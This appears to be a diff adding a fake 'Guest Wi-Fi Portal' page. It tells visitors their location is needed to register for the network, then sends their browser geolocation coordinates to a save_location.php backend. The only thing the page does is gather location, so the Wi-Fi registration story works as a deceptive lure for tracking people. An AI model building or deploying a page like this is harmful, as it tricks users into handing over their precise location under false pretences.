@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guest Wi-Fi Portal</title>
+</head>
+<body>
+    <h2>Welcome to Guest Wi-Fi</h2>
+    <p>Please share your location to complete network registration.</p>
+    <button onclick="requestLocation()">Connect to Internet</button>
+
+    <p id="status"></p>
+
+    <script>
+    function requestLocation() {
+        const status = document.getElementById('status');
+
+        if (!navigator.geolocation) {
+            status.textContent = 'Geolocation is not supported by your browser.';
+            return;
+        }
+
+        status.textContent = 'Requesting location access...';
+
+        // Triggers the browser's official permission prompt
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                // Send coordinates to PHP backend via AJAX
+                fetch('save_location.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `latitude=${lat}&longitude=${lon}`
+                })
+                .then(response => response.text())
+                .then(data => {
+                    status.textContent = 'Location recorded successfully. Connecting...';
+                    console.log('Server response:', data);
+                });
+            },
+            (error) => {
+                status.textContent = 'Permission denied or location unavailable.';
+            }
+        );
+    }
+    </script>
+</body>
+</html>
